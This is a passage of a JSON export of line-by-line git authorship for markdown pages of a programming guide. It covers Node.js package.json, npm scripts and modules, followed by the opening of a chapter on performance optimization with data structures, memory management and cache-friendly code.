          "gitId": "-"
        },
        "content": "  \"author\": \"\","
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": "  \"license\": \"ISC\""
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "The **name** and a **version** forms a unique identifier for the package. When a package is updated, the version number must be updated. A good **description** string and **keywords** helps others discover your package."
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "The `dependencies` property specifies dependencies needed in production while the `devDependencies` property specifies dependencies needed in development."
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": "```json"
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "{"
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": "  \"dependencies\": {"
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": "    \"express\": \"~3.0.1\","
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": "    \"sequelize\":\"latest\","
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "    \"bluebird\": \"^3.4.7\","
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "    \"angular\":\"latest\","
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": "  },"
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "  \"devDependencies\": {"
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": "    \"eslint\": \"^4.16.0\","
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": "    \"eslint-config-airbnb-base\": \"^12.1.0\","
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": "    \"eslint-plugin-import\": \"^2.8.0\""
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "The `dependencies` property maps to an object that has the name and"
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cpopover header\u003d\"**Version Range**\" trigger\u003d\"click\"\u003e"
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003ctemplate slot\u003d\"content\"\u003e"
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "It is common to find carets (`^`) and tildes (`~`) in the version range.\u003cbr\u003e"
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "This is part of npm\u0027s powerful \u003ca href\u003d\"https://nodesource.com/blog/semver-a-primer/\"\u003eversion specification system\u003c/a\u003e, which allows"
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "users and developers of the package to keep its dependencies compatible."
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003c/template\u003e"
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "version range"
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003c/popover\u003e"
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "for each dependency. It is important to specify an appropriate version range to ensure consistency and so that users and developers will have compatible dependencies. For instance, using the latest version of a dependency may introduce breaking changes from API deprecation, making debugging harder."
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "It is also possible and easier to install a new dependency and update `package.json` directly from the command line with"
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "``` {.no-line-numbers}"
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "$ npm install \u003cpackage_name\u003e"
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "Once a dependency is installed, the package\u0027s code will be added to the local `/node_modules` folder."
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": "The [module section](#benefit-7-easy-to-reuse-code-from-others) describes how to import packages in your code."
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Benefit 6: Versatile npm `scripts`"
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "`package.json` also contains a `scripts` property, which allows specifying various common commands to be run."
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": "For example, inside your `package.json`, you might have"
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": "```json"
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": "{"
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": "  \"scripts\": {"
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": "      \"build\": \"node app.js\","
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": "      \"lint\": \"eslint **/*.js\","
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": "      \"lint-fix\": \"eslint --fix **/*.js\""
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "Running `npm run build` in the command shell will execute `node app.js` and similarly `npm run lint-fix` will fix your linting errors in your JavaScript files."
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "Apart from acting as \u003ctooltip content\u003d\"See here for some common use cases of npm scripts!\"\u003e[shortcuts](https://css-tricks.com/why-npm-scripts/)\u003c/tooltip\u003e to commonly used commands, this also sets up and encourages a consistent development and build workflow in the project."
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Benefit 7: Easy to Reuse Code From Others"
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "Node\u0027s module system allows you to include other JavaScript files and thus makes it easy to reuse external libraries and organize your code into separate parts with limited responsibilities."
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "Node comes bundled with useful [core modules](https://nodejs.org/api/) such as the `fs` (file system) module which includes classes, methods and events to deal with file I/O operations and the `https` module which helps Node to transfer data over HTTP."
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "There are also many useful and well-tested modules maintained by the community and external developers such as \u003ctooltip content\u003d\"A library providing various useful wrapper functions over JavaScript\u0027s promises\"\u003e*Bluebird*\u003c/tooltip\u003e on \u003ctooltip content\u003d\"the largest ecosystem of open source libraries in the world!\"\u003enpm\u003c/tooltip\u003e."
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "This makes development a breeze -- if a specific functionality has a large development overhead, you could look to such modules to speed things up."
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "Importing modules is easy - simply use the `require()` function and provide the module identifier or the file path."
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "const https \u003d require(\u0027https\u0027); // import a core module"
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "-"
        },
        "content": "const Promise \u003d require(\u0027bluebird\u0027); // import a non-core module"
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "Node will first check if the module identifier passed to `require` is a core module or a relative path. If so, it will return the core module or the value of `module.exports` in the specified file path\u0027s code. Otherwise, Node will attempt to load the module from the `node_modules` folder in the parent directory of the current module."
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "### Benefit 8: Support for Better Code Organization"
      },
      {
        "lineNumber": 198,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 199,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "With Node\u0027s module system, you can create separate modules in your codebase such that each is focused on a single functionality. This makes your code more maintainable and testable."
      },
      {
        "lineNumber": 200,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 201,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "For example, in a parser module, you could export the `Parser` constructor in `parser.js` like so."
      },
      {
        "lineNumber": 202,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 203,
        "author": {
          "gitId": "-"
        },
        "content": "function Parser(options) {"
      },
      {
        "lineNumber": 204,
        "author": {
          "gitId": "-"
        },
        "content": "  this._options \u003d options || {};"
      },
      {
        "lineNumber": 205,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 206,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 207,
        "author": {
          "gitId": "-"
        },
        "content": "Parser.prototype.parse \u003d function (content) {"
      },
      {
        "lineNumber": 208,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  ..."
      },
      {
        "lineNumber": 209,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 210,
        "author": {
          "gitId": "-"
        },
        "content": "module.exports \u003d Parser; // override the exports object"
      },
      {
        "lineNumber": 211,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 212,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 213,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "Elsewhere, the Parser constructor would then be imported as such, allowing Parser objects to be created in other modules."
      },
      {
        "lineNumber": 214,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 215,
        "author": {
          "gitId": "-"
        },
        "content": "const parser \u003d require(\u0027../parser\u0027) // import content from parser.js based on relative file path. The js extension is assumed and can be excluded."
      },
      {
        "lineNumber": 216,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 217,
        "author": {
          "gitId": "-"
        },
        "content": "const content \u003d \u0027some content\u0027;"
      },
      {
        "lineNumber": 218,
        "author": {
          "gitId": "-"
        },
        "content": "const newParser \u003d new Parser();"
      },
      {
        "lineNumber": 219,
        "author": {
          "gitId": "-"
        },
        "content": "newParser.parse(content);"
      },
      {
        "lineNumber": 220,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 221,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 222,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Use Cases"
      },
      {
        "lineNumber": 223,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 224,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "Node is **good** for:"
      },
      {
        "lineNumber": 225,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "* **Processing high volumes of I/O-bound requests**. A single instance of a Node server will be more efficient and can serve more requests with the same hardware than most other servers, due to its event driven architecture. This makes a node server faster and more scalable."
      },
      {
        "lineNumber": 226,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "* **Real time applications** where you have to process a large volume of requests with little delay. This includes instant messaging apps and collaborative editing apps where you can watch the document being modified live such as [Trello](https://trello.com/) and Google Docs. Node is a good choice as it can handle multiple client requests even while waiting for responses."
      },
      {
        "lineNumber": 227,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "* **Single-page applications** where a lot of processing and rendering is done on the client\u0027s side and the backend server only needs to provide a simple API. Node can process many requests with low response times. In addition, you can reuse and share \u003ctooltip content\u003d\"e.g. validation logic for user inputs\"\u003eJavaScript code\u003c/tooltip\u003e between the client and server."
      },
      {
        "lineNumber": 228,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 229,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "However, Node is **not suitable** for"
      },
      {
        "lineNumber": 230,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "* **CPU-intensive jobs**. Recall that event loop is single-threaded. If the thread is busy doing CPU-heavy operations, it will not be able to process incoming requests timely. While it does have some amount of [multi-threading](https://blog.logrocket.com/node-js-multithreading-what-are-worker-threads-and-why-do-they-matter-48ab102f8b10/) support, being a JavaScript runtime, its performance in such cases still trails behind alternatives such as Python which supports threads natively."
      },
      {
        "lineNumber": 231,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 232,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 233,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Resources"
      },
      {
        "lineNumber": 234,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 235,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "* Try out Node online - [Node prototyping with Runkit](https://runkit.com/home)"
      },
      {
        "lineNumber": 236,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "* A guide on asynchronous programming in JS - [You Don\u0027t Know JS: Async \u0026 Performance](https://github.com/getify/You-Dont-Know-JS/tree/2nd-ed/sync-async)"
      },
      {
        "lineNumber": 237,
        "author": {
          "gitId": "-"
        },
        "content": "* A comprehensive introduction to Node -  [The art of node](https://github.com/maxogden/art-of-node/)"
      },
      {
        "lineNumber": 238,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "* Making better use of npm scripts - [freeCodeCamp\u0027s Introduction to NPM Scripts](https://medium.freecodecamp.org/introduction-to-npm-scripts-1dbb2ae01633), [How to Use npm as a Build Tool](https://www.keithcirkel.co.uk/how-to-use-npm-as-a-build-tool/)"
      },
      {
        "lineNumber": 239,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* Using `module.exports` - [Tendai Mutunhire\u0027s article](https://stackabuse.com/how-to-use-module-exports-in-node-js/)."
      },
      {
        "lineNumber": 240,
        "author": {
          "gitId": "-"
        },
        "content": "* Advice on how to write clean code that makes it easy to add new features - [Fundamental rules of a Node.js project structure](https://blog.risingstack.com/node-hero-node-js-project-structure-tutorial/)"
      },
      {
        "lineNumber": 241,
        "author": {
          "gitId": "-"
        },
        "content": "* A compilation of useful node modules - [Awesome Nodejs](https://github.com/sindresorhus/awesome-nodejs)"
      },
      {
        "lineNumber": 242,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "*  A summary and curation of the top-ranked content on Node best practices - [Node.js Best Practices](https://github.com/i0natan/nodebestpractices)"
      },
      {
        "lineNumber": 243,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "* Understanding node\u0027s architecture - [Node.js event loop architecture](https://medium.com/preezma/node-js-event-loop-architecture-go-deeper-node-core-c96b4cec7aa4)"
      },
      {
        "lineNumber": 244,
        "author": {
          "gitId": "-"
        },
        "content": "* More about `package.json` - [npm official documentation on package.json](https://docs.npmjs.com/files/package.json)."
      },
      {
        "lineNumber": 245,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "* When or when not to use Node? - [netguru](https://www.netguru.co/blog/use-node-js-backend), [Node.js foundation](https://medium.com/the-node-js-collection/why-the-hell-would-you-use-node-js-4b053b94ab8e)"
      },
      {
        "lineNumber": 246,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 247,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 18,
      "jamessspanggg": 3,
      "-": 158,
      "ang-zeyu": 68
    }
  },
  {
    "path": "contents/performance/Performance.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Introduction to Performance Optimization"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Introduction to Performance Optimization"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Author: [Ian Teo](https://github.com/IanTeo), [Phang Chun Rong](https://www.github.com/Crphang)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": "## Overview"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "-"
        },
        "content": "Computer performance can be defined as the rate of work accomplished by a computer system. Even if execution time is not important for a particular application, it may be important to reduce CPU cycles so as to consume less power; from applications running in small battery operated devices to huge data centres."
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e Premature optimization is the root of all evil."
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "-"
        },
        "content": "I think many people have heard of this quote from Donald Knuth before. This quote is actually misinterpreted frequently, because of the lack of context. Here is the full quote:"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e We should forget about small efficiencies, say about 97% of the time: premature optimization is the root of all evil. Yet we should not pass up our opportunities in that critical 3%."
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "You can find a nice explaination of the quote [here](https://wiki.c2.com/?PrematureOptimization)."
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": "This is not a guide on how to optimize that 3%, but rather, to explain standard optimization techniques that you should apply in all of your code, so that you do not create sub-optimal codes (premature pessimization). If you want to find out more about optimizing that 3%, you can find more at [Other Resources](#other-resources) below."
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "The 3 techniques you should know are:"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "* Using appropriate Data Structures and Algorithms"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": "* Memory Management Usage"
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "* Using Cache Friendly Code"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": "## Using Appropriate Data Structures and Algorithms"
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "Using appropriate Data Structures and Algorithms can improve the execution speed of your program trememdously. However, it requires time to learn and understand the nuances of each Data Structure and Algorithm and when to use them."
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "A good example of how Data Structures and Algorithms can improve execution time is with [binary search](https://www.tutorialspoint.com/data_structures_algorithms/binary_search_algorithm.htm). When finding a particular element in a list, you need to search through the entire list. If it has a million entries, every find will require you to look through **1,000,000** entries. However, if you have a [sorted](https://www.tutorialspoint.com/data_structures_algorithms/sorting_algorithms.htm) list, you can use binary search to reduce the number of entries you have to look through to around **20**!"
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "If you are interested in learning more about Data Structures and Algorithms, you can learn more from the following resources:"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* [Geeksforgeeks.org](https://www.geeksforgeeks.org/data-structures/): Introduction to data structures with code examples"
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "* [Introduction to Algorithms (Book)](https://www.amazon.com/Introduction-Algorithms-3rd-MIT-Press/dp/0262033844): A good read for beginners interested in data structures and algorithms"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* [MIT online course](https://courses.csail.mit.edu/6.851/spring12/lectures/): A online course by MIT on data structures and algorithms"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "* [topcoder.com](https://www.topcoder.com/community/data-science/data-science-tutorials/the-importance-of-algorithms/): A good write up on the importance of algorithms"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "## Memory Management Usage"
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "Memory management is important for performance optimization for Computer systems. One of the common techniques in [algorithms optimization](#using-appropriate-data-structures-and-algorithms) is space and time trade off, where we increase runtime memory usage to decrease overall runtime. While this theoretically optimizes your system runtime, it might overall slowdown the system due to [Thrashing](https://en.wikipedia.org/wiki/Thrashing_(computer_science)). Thrashing occurs when the system runs out of Random Access Memory and the Operating System swaps main memory to disk memory resulting in  significant time spent on disk access. Detecting if the performance slowdown is memory related can be done with appropriate [memory profiling](PerformanceProfiling.html)."
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "If your system suffers from memory related performance issues, here are some solutions you can adopt to resolve them:"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "- Using generators to reduce memory used. [Generators](https://en.wikipedia.org/wiki/Generator_(computer_programming)) are functions that generates a sequence of values. Instead of returning an explicit array upfront, a generator returns a value at each iteration. This can greatly [reduce memory usage](https://letstalkdata.com/2015/05/how-to-use-python-generators-to-save-memory/) for large arrays."
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "- Sometimes memory usage of your program remains high because the unnecessary variables are yet to be freed from memory. If you are using a garbage collected language like Java, consider [tuning](https://www.javacodegeeks.com/2017/11/minimize-java-memory-usage-right-garbage-collector.html) your garbage collector to suit your needs. If such options is not good enough, you can explicitly free memory even in garbage collected language. An example from Python is shown below:"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "    "
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "    ```python"
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "    import gc"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "    gc.collect()"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "    ```"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "- Using appropriate variable types can also offer memory usage improvement. For example, we should prefer to use primitive `int` over `Integer` to reduce the overhead introduce by the `Integer` Object wrapper. This [guide](http://java-performance.info/overview-of-memory-saving-techniques-java/) for Java also proposes ways to overcome obstacles introduced by the usage of primitives such as restrictions of JDK collections that requires Object wrappers."
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "## Using Cache Friendly Code"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "Before we can talk about this, we need to know what the computer memory is. Computer memory has different components, [registers](https://en.wikipedia.org/wiki/Processor_register), [L1/L2/L3 cache](https://www.cs.umd.edu/class/fall2001/cmsc411/proj01/cache/cache.html), [RAM](https://en.wikipedia.org/wiki/Random-access_memory), and [disk](https://en.wikipedia.org/wiki/Hard_disk_drive) in order of their speed."
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e You can take a look at the extent of the difference of their access speeds [here](https://gist.github.com/jboner/2841832) \u003cbr\u003e"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "\u003e You can also check out this [infographic](https://imgur.com/8LIwV4C)"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "To understand this topic, you only need to know how the cache works. It is okay if you do not understand exactly how the other components, registers, RAM and disk work. The cache is simply a place to store memory so that it can be accessed quickly. The cache is usually split into a few layers, L1, L2 and L3 cache, where the L1 cache is the fastest and L3 is the slowest. The faster a cache is, the more expensive it is. This means that the L1 cache (a few kilobytes big) is smaller than the L2 cache (a few megabytes big) and so on, until the RAM (a few gigabytes big)."
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "Whenever data is requested, the computer will first look in the cache for the data. If it exists, this is known as a **cache hit**. If it does not exist, this is known as a **cache miss**. When a **cache miss** happens, a contiguous block of memory containing the requested data is retrieved and stored onto the cache. Because of this, we want to remember these rules to make cache friendly codes:"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "* Temporal Locality"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
